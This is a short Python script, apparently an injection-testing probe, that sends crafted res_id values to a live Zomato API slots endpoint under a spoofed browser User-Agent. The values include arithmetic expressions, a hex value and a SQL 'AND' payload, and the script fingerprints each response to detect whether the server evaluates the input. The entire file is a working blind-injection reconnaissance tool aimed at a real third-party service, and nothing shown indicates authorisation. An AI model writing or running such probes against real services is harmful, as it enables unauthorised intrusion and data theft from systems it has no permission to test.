# -*- coding: utf-8 -*-
"""ET27: numeric arithmetic eval matrix on dining-gw tr/slots res_id"""
import http.client, ssl, json, time, hashlib

ctx = ssl.create_default_context()
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"

def get(p, read=500000):
    conn = http.client.HTTPSConnection("api.zomato.com", 443, timeout=15, context=ctx)
    conn.request("GET", "/dining-gw/consumer/web/tr/slots" + p, headers={"User-Agent": UA,
                "Accept": "application/json", "X-Requested-With": "XMLHttpRequest"})
    r = conn.getresponse()
    raw = r.read(read)
    conn.close()
    return r.status, raw

def probe(tag, rid):
    p = "?res_id=" + rid
    st, raw = get(p)
    sig = hashlib.md5(raw).hexdigest()[:8]
    msg = ""
    try:
        d = json.loads(raw.decode("utf-8", "replace"))
        msg = d.get("message", "") or (json.dumps(d.get("slots_response", {}))[:120])
    except Exception:
        msg = raw[:120].decode("utf-8", "replace")
    print("%-8s res_id=%-28s [%d] md5=%s %s" % (tag, rid, st, sig, msg), flush=True)

CASES = [
    ("B1", "1"),
    ("B2", "2"),
    ("B3", "99999999"),
    ("A1", "1-0"),
    ("A2", "2-1"),
    ("A3", "99999999-99999998"),
    ("A4", "2%2B0"),      # 2+0
    ("H1", "0x1"),
    ("F1", "1.0"),
    ("N1", "1%20AND%201"),
]
for tag, rid in CASES:
    probe(tag, rid)
    time.sleep(1.5)
print("done", flush=True)
